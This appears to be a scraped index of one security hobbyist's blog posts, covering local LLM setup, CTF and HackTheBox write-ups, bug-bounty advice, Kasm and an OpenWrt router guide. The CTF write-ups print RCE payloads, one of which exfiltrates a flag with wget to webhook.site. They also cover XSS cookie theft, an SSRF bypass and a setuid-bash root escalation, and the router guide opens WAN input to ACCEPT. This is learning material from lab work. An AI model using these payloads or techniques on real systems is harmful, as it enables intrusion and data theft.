As someone who\u0026rsquo;s interested in exploring the capabilities and security of AI, I wanted to experience firsthand how this technology can be used.\nInstallation The installation process was surprisingly straightforward when using ollama. And it has support for Windows, Linux, and macOS. So first visit https://ollama.com/ and select Download. This just brings us to a page to select the operating system we will be using for the instal.\nI started out using the Linux install on Ubuntu over WSL. This worked great until I wanted to add Open WebUI and after installing it I realized it was just stuck having server connections errors and I was forced to use the docker --network=host options. This wasn\u0026rsquo;t alright with me as I wanted to use the LLM over my entire home network so instead of a deep dive into attempting to make the WSL work, I simply choose to use Windows.\nSince I am using Windows I downloaded the OllamaSetup.exe from the download options. Run the installer and follow the quick installation wizard\u0026rsquo;s instructions.\nCongrats! You\u0026rsquo;re all set!\nTo run ollama from Windows, open the command prompt or powershell and enter the below command:\nollama run llama3:latest\nThis will grab the latest 8b model if it isn\u0026rsquo;t already on the system and run once downloaded. Currently there are two main models for llama3 and they are 8b and 70b.\nMost local environments will want to run the 8b model as the hardware requirements of the 70b model are more than just about any regular has in their home system! But definitely feel free to grab all the models you feel like playing with - I definitely did! But I do suggest starting out with the 8b model when first setting up as its super quick to download and test that everything is working well first.\nAdding Open WebUI To add a nice UI similuar to ChatGPT we can utilize Open WebUI. It will require Docker to be installed and the command to run the Docker is:\ndocker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main\nThen simply navigate to http://127.0.0.1:3000/auth/ and select \u0026lsquo;Sign up\u0026rsquo; to create an account. Then select the model you wish to use at the top middle drop down menu and start sending prompts! or payloads, I wont judge!\nConclusion One of the most impressive aspects of the llama 3 70b model is its ability to generate coherent text based on the input it receives.\nThe 8b model was impressively fast but the results were often far less desirable or completely inaccurate. In contrast, the 70b model showed a marked improvement in output quality.\nI look forward to digging into creating the best prompts to make these models work even more efficiently and to begin my LLM security testing journey!\nThis has been my experience with installing and running llama 3 locally. If you\u0026rsquo;re interested in exploring the possibilities of AI for yourself, I highly recommend giving it a try.\n","date":"April 28, 2024","hero":"/posts/ollama3installation/hero.png","permalink":"http://localhost:1313/posts/ollama3installation/","summary":"I recently decided to install and run LLaMA 3, a popular AI model for generating human-like text, on my local machine.

There is nothing in Daniel’s home directory so I checked if there was any other users under home and sure enough there is a user named matt and matt has theuser.txt flag but I am unable to read it just yet.\ncat: user.txt: Permission denied\nNext I checked sudo -l but Daniel has no permissions to for sudo. So I went and checked if there was anything interesting in the webserver config files.\nHere I found another virtual host mention by pandora.panda.htb.

Apologies for the short writeups. They were taking from the mess of notes and whatever screenshots I had taken to share with the group for discussion. I didn’t plan ahead to write a post about it after so learning better note keeping is definitely going on the list!\nKryptos Support For this task we were simply given a page saying “Report any issues regarding the Kryptos Vault below” and an input field similar to a reporting system where after submission the admin checks our report.\nImmediately XSS came to mind and I submitted a request that would send the cookie to my https://webhook.site/ link if it didn’t have security in place to stop the cookie from being sent. Easily enough the cookie was sent to the webhook.site link I supplied and I used this to gain access to the sites /tickets page.\nThis is where I first got stuck. We are given serials for the vaults but if we make a request asking for a new rfid how do we intercept the admins reply?\nAfter giving up on trying to discover a way to intercept a request over XSS I explored some more and found a password reset function at /setting. Intercepting this with Burp reveled there was two fields required, “password” and “uid”. As in most cases the first id given on a system will belong to the admin I tried changing the uid to 1 and was successfully able to login as admin!\nThis was all that was required to achieve the flag.\nBlinkerfluids For this one we were given the option to download the docker file. I downloaded the file while starting up the instance and had a quick look through it to see what I would be dealing with.\nIn one file the dependencies were listed.\n\u0026#34;dependencies\u0026#34;: { \u0026#34;express\u0026#34;: \u0026#34;4.17.3\u0026#34;, \u0026#34;md-to-pdf\u0026#34;: \u0026#34;4.1.0\u0026#34;, \u0026#34;nunjucks\u0026#34;: \u0026#34;3.2.3\u0026#34;, \u0026#34;sqlite-async\u0026#34;: \u0026#34;1.1.3\u0026#34;, \u0026#34;uuid\u0026#34;: \u0026#34;8.3.2\u0026#34; So I immediately did a google search on each of these to see what the newest versions were. Then did a google search on any that were not at latest versions. This brought me to a vulnerability in md-to-pdf:\nhttps://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880\nI had to do a bit of research into JavaScript Front Matter to understand the payload and how I would need to use it on the site. Afterward I intercepted a request from /api/invoice/add and played around with the payload and worked with a team member to find one that worked:\n--js\\n((require('child_process')).execSync('id \u0026gt; /tmp/RCE.txt'))\\n---RCE\nFrom there we simply had to change id to ls and locate the flag!\nAmidst Us This one turned out to be a simple and cute site with the ability to upload images that replace the two sus peeps on the page. This makes a post request to /api/alphafy that looks like { “image”:”iVBORw...ElFTkSuQmCC” ,”background”:[ 255, 255, 255 ] }\nAfter downloading the docker image and having a look through the use of ImageMath.eval stands out to the group as it has a known vulnerability, CVE-2022-22817. https://www.cvedetails.com/cve/CVE-2022-22817/\nThis allowed us to use the payload \u0026quot;exec('import os;os.system(\\\u0026quot;flag=$(cat ../flag.txt);wget https://webhook.site/webhook_uuid?flag=${flag}\\\u0026quot;)')\u0026quot; in any of the background parameters to get the flag.\nMutation Lab This challenge was using the convert-svg-to-png nodejs package which with a little googling reveled it had a known vulnerability CVE-2021-23631. https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGTOPNG-2348244. With this POC I sent the request to /api/export over to repeater and played around.\nThis was an immediate success but not an easy win. As a lengthy and somewhat blind search of the system reveled no flag to find. I went back to the other challenge dockers and used them to figure out some of the paths and files for this web app and read through the code on each many times trying to figure out what to do next.\nEventually I came across /app.env which gave me the SESSION_SECRET_KEY.\nUnfortunately I did not know how to write code to get the admin cookie from this so I was stuck there.\nConclusion I was able to see how much further I have come from last years attempt at this event. I was quite new to CTF events and felt like I didn’t know enough to join a group. This year I had enough confidence to join a group. Sadly it only ended up having 4 of the 10 people allowed and 2 of those gave up and went silent after the first day. But even having one other to work with and bounce thoughts back and forth was such a better experience!\nI am happy with how quickly I was able to recognize where the vulnerabilities likely were and what we were meant to do to achieve the flag. It thought me that I have much to learn with actually exploiting the vulnerabilities so I don’t give up the obvious direction too quickly and waste too much time looking for possible alternatives instead.\nI look forward to spending more time learning on HackTheBox machines now after I finish this sub with PentesterLab, as I now believe there is much more I can learn there and that I am ready to step a little away from the more hand held platforms.\n","date":"May 23, 2022","hero":"/posts/htbctf2022/hero.png","permalink":"http://localhost:1313/posts/htbctf2022/","summary":"Intro I have decided to write on my experience at this years HackTheBox CTF event.

Since they are overlooked however, it is the easiest and fastest way to finding high ranking and valid vulnerabilities.\nHowever, you do not absolutely need to follow this method to do well. A lot of people start out focused on paying bug bounty programs as XSS is still relatively easy to find. But the issue is that most people new to bug bounties get so excited to find the XSS that they immediately report it and simply have a medium or P3 finding. What you want to do for more and higher quality private invites is to find a way to escalate those XSS findings before submission!\nPicking a platform So I will say that I only really have experience in dealing with HackerOne and BugCrowd right now. They are both good platforms, although I personally feel that BugCrowd is a lot more beginner friendly and HackerOne is better for the more experienced. I am sure you will do amazing in whichever you choose!\nHackerOne Offers the ability to learn on its platform and complete free capture the flag labs for points toward private program invites. I do believe that this platform is the only one that gives you an opportunity to get private invites at all before having any valid submissions. However, this platform does not reward you anything for your time and effort if your submissions turn out to be duplicates. It is more difficult to get valid submissions on this platform but it did swarm me with far more private invites than I knew what to do with as soon as I did!\nBugCrowd This platform awards you for finding even duplicates with adding to your total vulnerabilities found and achievements! It gave a decent amount of private invite request but also has a section you can go to with private programs and you can choose to join them once you meet the requirements. The requirements are easier to meet since even duplicates count as your valid vulnerability findings.\nApologies if I did not cover a platform that you are interested in. There are so many to choose from and you are in no way required to pick from these two. They are merely examples from my own experience.

Lastly I want to mention when you feel like you are struggling and seeing everyone’s accomplishments on social media is getting you down, remember that they too struggled. Remember, Many of life’s failures are people who did not realize how close they were to success when they gave up.\nInitial Steps When I started out I had run across a few web application testing checklists and thought that was a great way to start. The one I found to be most helpful is by six2dez and is located at https://github.com/six2dez/pentest-book/blob/master/others/web-checklist.md but it is also a part of their Pentest Book of resources at https://pentestbook.six2dez.com/. So far this is the only check list that I have run across that goes as far as listing the tools used and even linking to parts of their book that give usage examples so huge thanks to six2dez!\nInitially I had decided that I was going to pick one program and run through the checklist the best I could while testing the tools and methods they used as well as others I could find to get a feel of what worked best for me. Also a lot of the tools and techniques that you run across in past resources will be outdated but are still a good guideline. I worked through the recon scopes of the list first, it’s very important to always begin on your target with a solid recon plan. But at the same time when I was going through initial recon on my single target I was testing out vulnerability scanners on it and other targets.\nScanner Approach On the side I have been running tools for a few reasons. I wished to discover which ones worked best and also to get some experience finding vulnerabilities in the wild. Investigating templates and doing further research online whenever there was a discovery was the most fun learning experience to me. Although everything that I have found this way has either been a false positive, already reported, or a disclosure program that does not reward cash. But there are a few real values in this approach still.\nFirstly, I learned to tell what was more likely to be a false positive or not and how to research into many new and varying vulnerability types. Also that some things things that appear to be false positives or not serious enough to report can be chained or otherwise lead to a more serious vulnerability with some time and effort.\nSecondly, this is free penetration testing experience. Whether its on paid or disclosure programs it is still real world experience and learning how to submit good reports even if its on disclosure only programs or only leads to duplicates will help you submit great reports to paying ones in the future that might even land you more of a reward if you impress them enough!\nManual Approach My approach has changed quite a bit since I first started. Currently what I am trying out Portswigger Academy, https://portswigger.net/web-security/all-materials. This is a free learning resource that is meant to be used alongside their Burp Suite Application. It is really meant to be used alongside the paid version but whenever labs do require it they tend to give alternative methods of completion. I picked a couple programs and as I learn sections on portswigger I then go and test them out on those programs. I do suggest having more than one program to test on as this helps to see differences in responses and how the developers think.\nI know a lot of bug bounty hunters suggest picking a program that is wide scope and you can hunt on it longer. While there is indeed many benefits to this I feel like this approach is likely to be less successful to new hunters than in their times where there was much less competition. But I also believe having two to three programs to focus on is the best approach and that picking one with a large scope is in fact a good idea still. As for the other one or two program choices? Pick stuff you either use often or have an interest in using or learning. It’s a much more competitive field now and it’s easy to feel burned out not finding anything for long periods so have at least one program that helps keep that interest flowing!\nConclusion Manually picking a target or targets to test on for an extended period of time and diving in to your favorite learning resource (portswigger, pentesterlab, bugbountyhunter, etc.) will be the best path to finding undiscovered high impact vulnerabilities. If you are able to put all your time into this method without feeling burned out it is probably the best choice to focus most if not all your energy.\nWhile automated vulnerability scanners can help you get experience in reporting and digging into specific CVEs (which I find to be the most fun so far and a good distraction when I am feeling stressed or burned out). Most bug bounty programs however frown on the use of vulnerability scanners as they really are heavy on traffic and they have likely already put their systems to these tests. If you do plan on using scanners be sure that the programs you choose don’t specify not using them and make sure you follow rate limits they require and add those headers whenever possible or they will block your ip and possibly go after your VPS! As always if anyone has any recommendations I would love to hear them!\nMy Favorite Tools Subfinder — https://github.com/projectdiscovery/subfinder The very best at passive subdomain finding. If you need to be more through of course you should use other tools as well such as amass and assetfinder. But when you want fast and effective this tool is amazing.\nNuclei — https://github.com/projectdiscovery/nuclei The most effective vulnerability scanner I have tried yet. Full of false positives and duplicates but lots of learning! Be sure to use headers and limited those rates as required or they will block and report you.\nhttpx — https://github.com/projectdiscovery/httpx There really isn’t much this tool cant do for you in recon. Its a fast and easy to use tool for getting titles, status codes, tech detection, probing for content, IP addresses and much more including many options for filtering results.

The main resources I found to be the best for learning were TryHackMe and the Practical Ethical Hacking course by TCM Academy. The problem I learned mostly by following the major community leaders in Youtube, LinkedIn and Twitter, is that there are already far more people wanting to be penetration testers than there are open roles for them to fill. But this was alright as these courses still taught the basics required for most other Cyber Security roles.\nThe problem I actually had was finding myself quickly overwhelmed by the sheer amount of materials available and how much more in depth I wanted to learn. I needed somewhere to begin my focus on so I decided to go back to the Practical Ethical Hacking course curriculum and choose a section from there to dig deeper into. As you can probably guess from the title, the Web Application Enumeration and Top 10 Web Application Vulnerabilities are what stood out to me. I knew that the Bug Bounty scene had been gaining a lot of popularity lately and it gave me the opportunity to not only learn a lot but possibly make a little side cash to help fund more certifications or fun projects.\nThe Beginner Methodology Initially and somewhat shamefully my first response, since my web application knowledge is limited to a web application programming course taken in uni and a little bit in TryHackMe and OWASP Juice Shop, was to find tools and scan ALL the things. I thought that maybe I could find some things from them and learn from there but it is highly unlike to find low hanging fruit especially on bug bounty programs which have already been scanned by many others and this wasn’t going to be nearly as easy as intentionally vulnerable applications.\nDoing this did however lead me to a couple auto recon tools that I do find to be very helpful. reconftw which you can find over at https://github.com/six2dez/reconftw and Sn1per which you can find at https://github.com/1N3/Sn1per. They handle a lot of the very helpful initial recon for me. Another amazing resource is the Pentesting Web checklist by six2dez found at https://github.com/six2dez/pentest-book/blob/master/others/web-checklist.md. The recon tools can cover a good amount of this checklist but I prefer to also manually go through each part and try out the different tools and methods myself. Also while the tools are running it is very important to have OWASP ZAP and Burp open while manually crawling through the websites. I have personally found out a lot more about the sites by doing this.\nSo at first I was scanning around different bounty programs and while this might be the faster way of finding something, I didn’t really feel like I was learning anything. So I decided to pick one program and stick to it. Most importantly my goal has been to learn everything I can about their tech stacks. Especially their versions and known vulnerabilities the software has or has had in the past.\nIt is also important to learn about these web application vulnerabilities, so I have also been reading Real-World Bug Hunting: A Field Guide to Web Hacking by Peter Yaworski and after reading about each vulnerability I have been testing them out on my bug bounty program of choice. I do want to note that I did read over this book before I even started on this journey but it honestly didn’t make a whole lot of sense to me then. I understand a lot of it much clearer now and I will likely end up reading over it again at least once more in the future as my understanding grows. So if the material that you look up now doesn’t make sense do not give up! You will get there!\nNext Steps One of the things I have been working on is growing my LinkedIn and Twitter communities. Especially Twitter is a great way to learn about new things and keep up with current happenings but it’s also been a great resource for finding out about course discounts or giveaways! I tend to spend a half hour or hour before bed reading over posts.\nThat being said I plan to take a break from that unless I have the extra time and instead make it my priority to spend that particular time reading over reports on HackerOne. The Hactivity section is a great way to find the latest disclosures and reading the reports is probably going to be the best way to learn as they often include the disclosed report. I also plan to get back to the free amazing web security training from PortSwigger Academy located over at portswigger.net/web-security.\nHopefully the next time I write it will be to talk about a bug I found and how I accomplished the finding. But if not I will not be discouraged as my goal and my passion is learning and I have learned so much already! Remember, bug bounty hunting is free hands-on pentesting experience!\n","date":"February 23, 2022","hero":"/posts/beginnerbb/hero.png","permalink":"http://localhost:1313/posts/beginnerbb/","summary":"Introduction I began my journey with all the many resources out there both free and paid that are centered on training you to become a penetration tester.

We can’t really do anything with the filtered port but it’s nice to know that it is there. I wasn’t able to find a way to make Rustscan discover this filtered port that Nmap had so I may default back to using nmap. Or just keep trying them both out like I have been.\nSo here we have 3 open ports. The 2 standard ports on 22:ssh and 80:http and a filtered ftp port on 21. Again we cannot do anything on the filtered port so it is time to check out the only option, the website.\nImmediately we notice the option to Upload an image. Trying to upload a php reverse shell comes back with:\nTrying again with curl shows our script is there but it wasn’t run. Maybe this server isn’t running php. Running a netcat listener and submitting my own ip on the site shows that this is infact running Python.\nRunning ffuf immediately comes back with an interesting subdomain:\nAdding this new discovery to /etc/hosts and attempting to visit it gives us this message:\nOnly localhost is allowed!\nAttempting to upload a file from url with the url http://admin.forge.htb tells us this is blacklisted.\nI was able to bypass this silly blacklist by simply using http://ADMIN.FORGE.HTB instead. Using curl on the link it provides reveals another directory /announcements.\nNow to get a new link by uploading from the url http://ADMIN.FORGE.HTB/announcements and using curl on that.\nWe get the internal ftp server credentials of user:heightofsecurity123!. Seems filtered ports aren\u0026rsquo;t always useless to know about but we would have found out about it this way even if I hadn\u0026rsquo;t used nmap.\nTime to try http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB and curl that url responce. And we get the directory with user.txt so all we have to do to get the flag from user.txt is to add it to the end of the url. http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/user.txt\nInitial Foothold To get the initial foothold onto the system all we have to do now is upload from the url again but this time to http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/.ssh/id_rsa\nnano id_rsa and paste the private key info in there and don\u0026rsquo;t forget to chmod 600 id_rsa. And we are in!\nPrivilege escalation First thing we always do once we gain user access is to check what sudo permissions that user has.\nThe user has sudo access to running a specific python script so time to see what this script does and how we can use it to gain root access.\nWe get the password secretadminpassword. I ran the script and found that it is listening on port 48888.\nThis brings up a menu. If you enter invalid information into the menu it brings up a Pdb debugger.\nNow we can use Pdb debugger to get root access with the following commands:\n(Pdb) import os (Pdb) os.system (\u0026#39;chmod u+s /bin/bash\u0026#39;) (Pdb) exit user@forge:~$ /bin/bash -p Just cat out /root/root.txt and machine complete!

But this software can easily have many personal uses with its disposable browsers and desktops. Options to host Kasm Workspaces include on-premise, in the cloud, or they even have the option to host it for you.\nThe most interesting feature to me is their Zero-Trust Browser Isolation which according to their website…\nWeb isolation moves the risk of browsing the web outside of the enterprise. All webinteractivity is executed in docker containers running in an isolated environment with only a seamless rendering user interface being sent to the user’s browser. Your users will feel as if they are experiencing the web firsthand, however, since web content never directly interacts with the user’s endpoint, your enterprise is protected against malware and your data remains safe. The best thing is that this software is available for free and open source!\nResource Requirements Minimum Requirements\nCPU - 2 cores Memory - 4GB Storage - 50GB (SSD) Supported Operating Systems\nUbuntu 18.04 / 20.04 (amd64/arm64) Debian 9 / 10 / 11 (amd64/arm64) CentOS 7 / 8 (amd64/arm64) Oracle Linux 7 / 8 (amd64/arm64) Raspberry Pi OS (Debian) 10 / 11 (arm64) Installation As the most secure option I really wanted to find a cloud provider for this but with the minimum resource requirements I was looking at $20 a month so I decided to pass on that idea and looked at the next great option, Raspberry Pi. Unfortunately only Raspberry Pi 4 has the necessary resources and I didn’t have any and due to the chip shortage that seems to have no end in sight these devices now cost a lot and take months to get.\nSo in order to play around with this amazing software I loaded up the VirtualBox Ubuntu 18.04 machine I had, you can use any of the supported operating systems you are comfortable with or better yet…try something new and unfamiliar!\nPreInstallation So firstly what we actually want to do is create a swap partition. It is recommended to allocate 1 gigabyte per concurrent session you expect to run at any given time. Please adjust according to your needs.\nsudo dd if=/dev/zero bs=1M count=1024 of=/mnt/1GiB.swap sudo chmod 600 /mnt/1GiB.swap sudo mkswap /mnt/1GiB.swap sudo swapon /mnt/1GiB.swap Verify that the swap file exists\ncat /proc/swaps To make the swap file available on boot\necho \u0026#39;/mnt/1GiB.swap swap swap defaults 0 0\u0026#39; | sudo tee -a /etc/fstab Installation Guide Download the latest version of Kasm Workspaces to /tmp Extract the package and run the installation script. cd /tmp tar -xf kasm_release*.tar.gz sudo bash kasm_release/install.sh Note: If you would like to run the application on a different port than the default 443 specifiy the port like so for the command above - sudo bash kasm_release/install.sh -L PORT\nOnce the installation is complete the login details will be displayed. Save these somewhere safe for now.\nYes it really is as easy to install as that!\nLogin Access the Web Application running on port 443 at https://\u0026lt;WEBAPP_SERVER\u0026gt;\nLog into the Web Application as the Administrator using the default credentials produced during the install. I suggest heading to the top right and selecting profile then reset password and changing the password to something more secure and saving that to a password manager.\nClicking on Workspaces at the top you can see a list of everything avaliable to launch in it’s own Docker container. If you wish to add something that isn’t already on the workspaces list, say Kali linux for example, head over to Images on the left side menu.\nFrom there you can find the image you want or add your own. So for example if you wish to add Kali Linux you would find it on the list and click the \u0026hellip; then Edit and check the Enabled option then Submit. It will appear on the Workspaces page now but will take some time for it to setup before its ready to use.\nThere is also options for adding persistant data. See the guide for this at https://kasmweb.com/docs/latest/how_to/volume_mapping.html if needed.\nBy default this comes with a couple Desktop options already. While you do have the option to add custom images, the default Desktop does come with some great applications already installed. It has Microsoft Teams, Slack, Zoom, Visual Studio Code and Signal to name a few. These Desktops will stay open even when you log off Kasm, however if the desktop is killed by the Administrator the data in the container by default is lost. It is possible to map data out to a central server using the persistant data link above.\nKasm - Open In Isolation The main thing I absolutely love about Kasm is the Chrome extension which makes it easy to right click any link that might not be safe and open it in Kasm.\nTo do this yourself grab the extension from https://chrome.google.com/webstore/detail/kasm-open-in-isolation/pamimfbchojeflegdjgijcgnoghgfemn?hl=en-US.\nOnce you’ve added the extension to your browser click it and select options. Set the Kasm Url to the url of your machine and set whether you want it to open in a new tab or a new window and Save.\nNow when you right click links you have the option to Open link in Kasm. When you are working within Kasm Workspaces there is always a menu on the left. When you are done with the session or think you encountered something suspecious you can delete the session there. Otherwise if you leave the session without deleting it then it will expire on its own after some time.\nThoughts Kasm is software that is based on Docker and provides a Web interface to run applications and desktops within a sandboxed container. Note: As Kasm does run on a supported operating system, it is still your responsibility to ensure that the operating system itself is secure. Sadly this amazing software wont likely see a whole lot of usage in its target audience as businesses tend to use Windows instead of Linux especially since thats what most users know how to use.\nHonestly I love this and the single-server version is just great for home lab use! I can see great use for this especially with REMnux when I start getting into the reverse-engineering and analyzing malicious software side of security and I will continue to make use of the web isolation this provides.\n","date":"December 28, 2021","hero":"/posts/kasm/hero.png","permalink":"http://localhost:1313/posts/kasm/","summary":"Introduction Kasm Workspaces are delivered through Docker containers and is mainly aimed at small businesses looking to reduce platform resource requirements and increase security especially in this work from home space we have been moving into.

I always loved to play with tech and there was so much that could be done with such a handy small and inexpensive device.\nSo eventually and very excitedly I purchased the Raspberry Pi 3 when I had some extra cash to do so. But after an extensive search of existing Pi project lists, personal sites, and Youtube videos, I wasn’t really able to find many project or project ideas that actually interested me or felt worthy.\nFirst I tried out the famous Pi-hole. It was fun to setup and watch it work and it does indeed work rather well but it felt like a waste to just use the device for that. As I was interested in security I started to wonder if I could use this little device for IDS/IPS and actually found existing guides for installing and configuring Snort on Raspberry Pi.\nIn my excited haste I was able to get Snort all setup and running before finding out that the Raspberry Pi 3 does not have the CPU or Memory required. In my disappointment I placed the Pi away in a drawer for some years before I recently ran across this video by NetworkChuck: https://www.youtube.com/watch?v=jlHWnKVpygw.\nI immediately grabbed that old Raspberry Pi 3b out and got to work installing and playing with OpenWrt on it. So, you might be wondering…why OpenWrt?\nWhile NetworkChuck’s idea of using it as a travel router for security purposes really interested me and I do plan on using it as such when I do travel. My main use for it currently is subnetting certain systems on my network from others while providing these wireless devices with an adblock at the router level. Some of these devices being rather difficult or impossible to get adblocks onto themselves. I also have a vpn setup on the OpenWrt but I am currently using the free ProtonVPN instead of the nordVPN that NetworkChuck uses.\nInstallation Firstly, you will need to find your Raspberry Pi model and version and download the OpenWrt image from https://openwrt.org/toh/raspberry_pi_foundation/raspberry_pi.\nThen install that operating system onto your Raspberry Pi’s microSD card. Personally I enjoy using the simple Raspberry Pi Imager from https://www.raspberrypi.com/software/.\nInsert the microSD back into your Raspberry Pi once the Imager is complete and connect your Pi to a laptop or pc using an Ethernet cable.\nBy default the OpenWrt gateway will be 192.168.1.1 which you should be able to access immediately but if you run into any issues connecting (remember to give the Pi some time if you recently booted it) then you might need to set your pc IP to an IP on the network like 192.168.1.10.\nNext you will want to use SSH to access and configure your new Pi router.\nssh root@192.168.1.1\nAs you might have noticed, it does not prompt you for a password which is super insecure and you should definitely change this first by running:\npasswd\nEnter a new super secure password of your choosing!\nNow its time to edit some configurations.\ncd /etc/config\nYou can create backups of the config files first if you like by doing:\ncp firewall firewall.bk cp network network.bk cp wireless wireless.bk It would take seconds to redo the whole process thus far if something did go wrong so while this backup isn’t necessary it is good to get into the habit of creating backups before making changes!\nCurrently we don’t have access to nano so we have to use vi to edit the config files. Which as much as we all want to cry at having to use vi it is good to learn or refresh on its use as this isn’t likely the only time you will experience an environment in which you are forced to use it.\nvi network\nWhere it says:\nconfig interface \u0026#39;lan\u0026#39; option device \u0026#39;br-lan\u0026#39; option proto \u0026#39;static\u0026#39; option ipaddr \u0026#39;192.168.1.1\u0026#39; option netmask \u0026#39;255.255.255.0\u0026#39; option ip6assign \u0026#39;60\u0026#39; Change option ipaddr '192.168.1.1' to something of your choosing that isn’t so commonly used. NetworkChuck for example used option ipaddr '10.71.71.1' so I will use this example going forward. Also add the line:\noption force_link '1'\nAfter option ip6assign '60'. At the bottom we will add a new interface:\nconfig interface \u0026#39;wwan\u0026#39; option proto \u0026#39;dhcp\u0026#39; option peerdns \u0026#39;0\u0026#39; option dns \u0026#39;1.1.1.1 8.8.8.8\u0026#39; If you wish to setup a vpn to use with this then there is one more interface you will need to add to the bottom:\nconfig interface \u0026#39;vpnclient\u0026#39; option ifname \u0026#39;tun0\u0026#39; option proto \u0026#39;none\u0026#39; Now to save and exit from vi simply hit esc then type in :wq and hit enter.\nThe next thing we need to configure is the firewall.\nvi firewall\nWhere it says:\nconfig zone option name wan list network \u0026#39;wan\u0026#39; list network \u0026#39;wan6\u0026#39; option input REJECT option output ACCEPT option forward REJECT option masq 1 option mtu_fix 1 Simply change option input REJECT to option input ACCEPT\nNow to save and exit from vi simply hit esc then type in :wq and hit enter.\nTime to reboot by using the command:\nreboot\nYou will get kicked out of the SSH session at this time. If you had to change your network adapter settings previously you will now have to go back and set it to obtain ip automattically again before continuing.\nGive it some time to reboot if you didn’t have to go change settings and maybe enjoy some coffee or some tea while waiting. SSH back with the IP and password you set.\nssh root@10.71.71.1\nSo now we must get the usb wifi setup. For this we will need internet access to download the drivers.\nvi /etc/config/wireless\nMake a few changes to the first config so it looks exactly like so:\nconfig wifi-device \u0026#39;radio0\u0026#39; option type \u0026#39;mac80211\u0026#39; option channel \u0026#39;7\u0026#39; option hwmode \u0026#39;11g\u0026#39; option path \u0026#39;platform/soc/fe300000.mmcnr/mmc_host/mmc1/mmc1:0001/mmc1:0001:1\u0026#39; option htmode \u0026#39;VHT80\u0026#39; option disabled \u0026#39;0\u0026#39; option short_gi_40 \u0026#39;0\u0026#39; Now to save and exit from vi simply hit esc then type in :wq and hit enter.\nUpdate the wireless interface configuration.\nuci commit wireless wifi Open a web browser to access the OpenWrt GUI by going to the IP 10.71.71.1 or whatever you choose for your IP.\nAfter you login select Network and Wireless and then click Scan. You will need to select your wireless network from the list and on the new window that pops up make sure Replace wireless configuration is selected and put in your WPA passphrase. Select Submit, then Save and lastly Save and Apply.\nGo back to your command prompt and ping google.com just to make sure the connection is working.\nNow that your Raspberry Pi has internet its time to update using:\nopkg update\nIf it fails reboot and run it again and it should work. After update is successfully completed its time to install usb drivers along with openvpn and nano. If you do not wish to use openvpn or nano simply do not include those commands.\nopkg install kmod-rt2800-lib kmod-rt2800-usb kmod-rt2x00-lib kmod-rt2x00-usb kmod-usb-core kmod-usb-uhci kmod-usb-ohci kmod-usb2 usbutils openvpn-openssl luci-app-openvpn nano Connect your wireless usb now and use lsusb and check that the wireless usb is listed there.\nNow we must edit the wireless config with the editor of your choice:\nnano /etc/config/wireless\nUnder config wifi-device 'radio1' set option disabled '1' to option disabled '0'\nThen under config wifi-iface 'default_radio1' change option ssid 'OpenWrt' to an ssid of your choosing. Change option encryption 'none' to option encryption psk2. And add another option line under it option key 'EnterStrongKeyHere' and enter your own strong psk2 key.\nSave and exit. If using nano its ctrl x y and enter.\nUpdate the wireless interface configuration.\nuci commit wireless wifi Connect to the new ssid you created for the wifi and make sure its giving internet.\nConfigurations! You’ve now got your very own Raspberry Pi Router!\nSetting up Ad Blocking OpenWrt comes with its own additional service for Ad Blocking. The setup is rather basic thankfully.\n# Install packages opkg update opkg install adblock # Provide web interface opkg install luci-app-adblock # Backup the blocklists uci set adblock.global.adb_backupdir=\u0026#34;/etc/adblock\u0026#34; # Save and apply uci commit adblock /etc/init.d/adblock restart Setting up VPN I set this up using the free ProtonVPN. If you dont already have an account with them and would like to use them on your Raspberry Pi device go ahead and create an account now on their website.\nOnce you are logged in head over to the Downloads section and scroll down to the OpenVPN configuration files section. Here you want to select Router for platform and leave the protocol as UDP. Scroll down and decide which server you want to use and click Download on that server.\nNext load up your OpenWrt GUI at 10.71.71.1 (or whatever you set your ip to) and login. At the top select VPN and OpenVPN. Now where it says OPVN configuration file upload give it a name and click Choose File. Select the file that you just downloaded and click Upload then Save \u0026amp; Apply.\nIt should now appear on the list above. Check the Enabled box and click start then Save \u0026amp; Apply.\nAt this point you will lose connection to the internet due to the firewall. I found that the best way to do this part was actually to follow NetworkChuck’s commands:\nuci rename firewall.@zone[0]=\u0026#34;lan\u0026#34; uci rename firewall.@zone[1]=\u0026#34;wan\u0026#34; uci del_list firewall.wan.device=\u0026#34;tun+\u0026#34; uci add_list firewall.wan.device=\u0026#34;tun+\u0026#34; uci commit firewall /etc/init.d/firewall restart You should have access to the internet once again. Go ahead now and make sure your connection is indeed running through the vpn.\nConclusion This has been my favorite Raspberry Pi project by far. While the rest were fun and a learning experience in themselves, they lacked the functionality to feel truly satisfying once complete.\nThe only downside to this project has been how truly simple it is to set all this up. There was very little issue that I ran into and had to do my own research for. So now my focus has been on what other capabilities and features OpenWrt has to play around with and continue to learn!\nI hope this guide has been interesting enough for you to give this project a try and discover all the great uses a Raspberry Pi Router can have in your life too!\n","date":"December 28, 2021","hero":"/posts/openwrt/hero.png","permalink":"http://localhost:1313/posts/openwrt/","summary":"Introduction So back when Raspberry Pi was super hyped I really wanted one.

The Practical Ethical Hacking course helped me learn more than any book and the hands on learning was just what I needed!\nThe Lab 1 Windows Server 2019 2 Windows 10 Enterprise Requirements 60 GB Disk Space 16 GB RAM Downloading the Necessary ISOs If you are able to get the ISOs from Microsoft Evaluation Center please feel free to do so. You can find it with Google search as it should be the first option that appears. I however, did not have any luck getting ISOs to finish downloading from here as they would always fail after a short bit. So I used https://tb.rg-adguard.net/public.php instead. As the ISOs on this site are legit and sourced directly from the MS servers.\nFor Windows 10 Enterprise: For Windows Server 2019: Setting Up the Domain Controllers I will be using Oracle VM VirtualBox for this out of personal preference but feel free to use whatever you are comfortable with or step out of your comfort zone and learn something new!\nFirstly, well setup the Windows Server 2019. Click Machine and New and give your virtual machine a name. Set the machine folder to a location of your choosing, making sure you have the required space on that drive. Set the type to Windows and version to Windows 2019 (64-bit). I left the memory size at the minimum 2GB but feel free to bump it up if you\u0026rsquo;d like and have the RAM to do so.\nIn the next window you will be creating the virtual hard disk. Set this to 60GB and leave it to dynamically allocated then click create.\nRight click the newly created VM and click on settings. Go to System and uncheck Floppy.\nThen go to Storage and select the Empty CD storage. 